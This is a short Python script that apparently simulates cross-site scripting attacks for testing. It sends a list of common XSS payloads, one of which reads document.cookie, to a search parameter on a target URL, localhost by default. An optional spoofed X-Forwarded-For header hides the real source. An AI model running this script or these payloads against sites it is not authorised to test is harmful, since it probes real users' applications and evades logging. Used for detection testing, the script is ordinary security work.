import requests
import time
import argparse

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')",
    "'\"><svg/onload=alert(1)>"
]

def send_request(target_url, payload, spoof_ip=None):
    """Sends a single malicious request to the target URL."""
    try:
        url_with_payload = f"{target_url}?search={payload}"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSS-Scanner/1.0'}
        if spoof_ip:
            headers['X-Forwarded-For'] = spoof_ip
        
        start_time = time.time()
        response = requests.get(url_with_payload, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        print(f"[XSS] Sent payload: {payload} | Status: {response.status_code} | Time: {elapsed:.2f}s | Spoof IP: {spoof_ip}")
        
    except requests.exceptions.RequestException as e:
        print(f"[XSS] Request failed: {e}")

def simulate_xss(target_url, count, delay, spoof_ip=None):
    """Simulates Cross-Site Scripting (XSS) attacks against the target."""
    print(f"Starting XSS Simulation against {target_url}")
    print(f"Total requests to send: {count}")
    print("-" * 50)
    
    for i in range(count):
        payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
        send_request(target_url, payload, spoof_ip)
        
        if delay > 0:
            time.sleep(delay)
            
    print("-" * 50)
    print("Simulation complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate Cross-Site Scripting (XSS) Attacks")
    parser.add_argument("--target", type=str, default="http://localhost:8080/search", help="Target URL")
    parser.add_argument("--count", type=int, default=10, help="Number of requests to send")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds")
    parser.add_argument("--spoof-ip", type=str, default=None, help="Spoof X-Forwarded-For IP address")
    
    args = parser.parse_args()
    simulate_xss(args.target, args.count, args.delay, args.spoof_ip)